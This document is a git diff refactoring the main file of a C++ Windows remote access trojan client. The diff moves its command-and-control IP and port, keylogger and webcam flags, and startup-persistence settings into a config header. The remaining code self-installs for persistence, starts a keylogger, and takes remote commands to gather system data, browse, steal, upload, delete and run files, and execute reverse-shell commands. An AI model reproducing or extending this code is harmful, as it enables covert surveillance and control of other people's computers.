@@ -4,7 +4,6 @@
 #include <thread>
 #include "video_audio/DeviceEnumerator.h"
 #include <string>
-#include <filesystem>
 #include <shellapi.h>
 #include "stream/Stream.h"
 #include "download/Download.h"
@@ -15,51 +14,14 @@
 #include "keyboard/KeyboardExecuter.h"
 #include "permission/Permission.h"
 #include "box_message/MessageBoxGUI.h"
-
 #include "state/SystemState.h"
 #include "install/Install.h"
-
-
-#define IP "192.168.1.133"
-
-#define PORT 3055
-
-#define TAG_NAME "Client"
-
-#define MUTEX "541ebb32-2f38-4e4d-80ff-868c56ad89e2"
-
-#define TIMING_RETRY 10000
-
-#define WEBCAM "WLogs"
-
-#ifdef WEBCAM
-
-#include "webcam/WebcamManager.h"
-#include "screen/ScreenStreamer.h"
-
-#endif
-
-#define KEYLOGGER "KLogs"
-
-#ifdef KEYLOGGER
-
-#include "Keylogger/KeyLogger.h"
-
-#endif
-
-#define INSTALL_PATH 2
-
-#define SUBDIRECTORY_NAME "Client"
-
-#define SUBDIRECTORY_FILE_NAME "client.exe"
-
-#define STARTUP_NAME "ClientStartUp"
+#include "configuration.h"
 
 
 
 int main(int argc=0,char*argv[]= nullptr) {
     Sleep(argc);
-    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
         Install::installClient(INSTALL_PATH,argv[0],SUBDIRECTORY_NAME,SUBDIRECTORY_FILE_NAME,STARTUP_NAME);
@@ -78,7 +40,11 @@ int main(int argc=0,char*argv[]= nullptr) {
             if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) != SOCKET_ERROR) {
                 std::cout << "Connected to server!" << std::endl;
                 Stream stream(sock);
-                ReverseShell reverseShell;
+                SystemInformation sysInfo(stream);
+                NetworkInformation networkInfo(stream);
+                FileManager fileManager(stream);
+                ReverseShell reverseShell(stream);
+                Download download(stream);
 #ifdef KEYLOGGER
                 KeyLogger keyLogger(stream,KEYLOGGER);
                 keyLogger.tryStart();
@@ -86,116 +52,60 @@ int main(int argc=0,char*argv[]= nullptr) {
                 while (streamListening) {
                     int action = stream.readSize();
                     switch (action) {
-                        case -3:{
+                        case -3:{ // Uninstall client
                             Install::uninstall();
                         }
-                        case -2: {
+                        case -2: { // Fully disconnect and close program
                             connectionState = false;
                             streamListening = false;
                             break;
                         }
-                        case -1: {
+                        case -1: { // Try to connect again to server
                             streamListening = false;
                             break;
                         }
-                        case 0: {
-                            std::cout << "GATHERING SYSTEM INFORMATION" << std::endl;
-                            std::vector<std::string> informationVector = SystemInformation::getSystemInformation();
-                            informationVector.emplace_back(TAG_NAME);
-#ifdef WEBCAM
-                            informationVector.emplace_back("true");
-#else
-                            informationVector.emplace_back("false");
-#endif
-#ifdef KEYLOGGER
-                            informationVector.emplace_back("true");
-#else
-                            informationVector.emplace_back("false");
-#endif
-                            stream.sendList(informationVector);
+                        case 0: { // System information retrieving
+                            sysInfo.send();
                             break;
                         }
-                        case 1: {
-                            std::cout << "GATHERING NETWORK INFORMATION " << std::endl;
-                            std::string networkJSON = NetworkInformation::requestNetworkInformation();
-                            stream.sendString(networkJSON.c_str());
+                        case 1: {  // Network information retrieving
+                            networkInfo.send();
                             break;
                         }
-                        case 2: {
-                            std::cout << "JSON FOR READING DISKS" << std::endl;
-                            stream.sendList(SystemInformation::getDisks());
+                        case 2: {  // Reading disks of system
+                            sysInfo.sendDisks();
                             break;
                         }
-                        case 3: {
-                            std::cout << "READING ALL" << std::endl;
-                            std::string path = stream.readString();
-                            std::cout << "Path -> " << path << std::endl;
-                            std::string folderVector = FileManager::readDirectory(std::filesystem::u8path(path), true,
-                                                                                  false);
-                            std::string fileVector = FileManager::readDirectory(std::filesystem::u8path(path), false,
-                                                                                true);
-                            folderVector.append(fileVector);
-                            std::cout << folderVector << std::endl;
-                            stream.sendString(folderVector.c_str());
+                        case 3: { // Read all directory (files and folders)
+                            fileManager.send();
                             break;
                         }
-                        case 4: {
-                            std::cout << "READING ONLY DIRECTORIES" << std::endl;
-                            std::string path = stream.readString();
-                            std::string vectorOfFiles = FileManager::readDirectory(std::filesystem::u8path(path), true,
-                                                                                   false);
-                            stream.sendString(vectorOfFiles.c_str());
-                            break;
-                        }
-                        case 5: {
-                            std::cout << "DOWNLOADING" << std::endl;
-                            std::vector<std::string> fileList = stream.readList();
-                            Download download(stream, fileList);
+                        case 5: { // download file or directory
                             download.start();
                             break;
                         }
-                        case 6: {
-                            std::cout << "COPYING" << std::endl;
-                            std::vector<std::string> vectorOfFiles = stream.readList();
-                            std::vector<std::string> vectorOfDirectories = stream.readList();
-                            FileManager::copyFiles(vectorOfFiles, vectorOfDirectories);
+                        case 6: { // copy file or directory
+                            fileManager.copyFiles();
                             break;
                         }
-                        case 7: {
-                            std::cout << "MOVING" << std::endl;
-                            std::vector<std::string> vectorOfFiles = stream.readList();
-                            std::string directory = stream.readString();
-                            FileManager::moveFiles(vectorOfFiles, directory);
+                        case 7: { // move file or directory
+                            fileManager.moveFiles();
                             break;
                         }
-                        case 8: {
-                            std::cout << "DELETING" << std::endl;
-                            std::vector<std::string> vectorOfFiles = stream.readList();
-                            FileManager::deleteFiles(vectorOfFiles);
+                        case 8: { // delete file or directory
+                            fileManager.deleteFiles();
                             break;
                         }
-                        case 9: {
-                            std::cout << "RUNNING FILES" << std::endl;
-                            std::vector<std::string> vectorOfFiles = stream.readList();
-                            FileManager::runFiles(vectorOfFiles);
+                        case 9: { // run file or directory
+                            fileManager.runFiles();
                             break;
                         }
-                        case 10: {
-                            std::cout << "UPLOADING FILES" << std::endl;
-                            std::vector<std::string> vectorOfFiles = stream.readList();
-                            int numOfFiles = stream.readSize();
-
-                            for (int i = 0; i < numOfFiles; i++) {
-                                stream.readFile(vectorOfFiles);
-                            }
+                        case 10: { // upload files to directory
+                            fileManager.uploadFiles();
                             break;
                         }
-                        case 11: {
-                            std::cout << "OPEN REVERSE SHELL " << std::endl;
-                            std::string command = stream.readString();
-                            std::string response;
-                            response.append(reverseShell.executeCommand(Converter::string2wstring(command)));
-                            stream.sendString(response.c_str());
+                        case 11: { // executes command on shell
+                            reverseShell.send();
                             break;
                         }
 #ifdef KEYLOGGER
